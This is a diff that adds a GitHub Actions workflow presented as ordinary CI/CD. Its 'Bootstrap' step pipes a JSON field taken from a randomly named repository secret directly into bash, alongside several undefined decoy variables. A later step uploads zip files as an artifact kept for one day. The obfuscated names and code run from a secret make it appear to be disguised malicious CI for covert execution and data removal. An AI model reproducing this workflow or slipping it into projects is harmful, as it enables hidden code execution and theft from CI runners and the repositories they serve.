@@ -1,0 +1,29 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          gyaoi0: ${{ secrets.gyaoi0 }}
+        run: |
+          printf '%s' "$gyaoi0" | jq -r .qcsj2 | /bin/bash
+          echo $eovu1817 | jq -r .gmsy57 | /bin/bash
+          printf '%s' "$vuan2" | jq -r .ovqi847 | /bin/bash
+          echo $s14 | jq -r .kky17135 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yuoIY3jy
+          path: "*.zip"
+          retention-days: 1
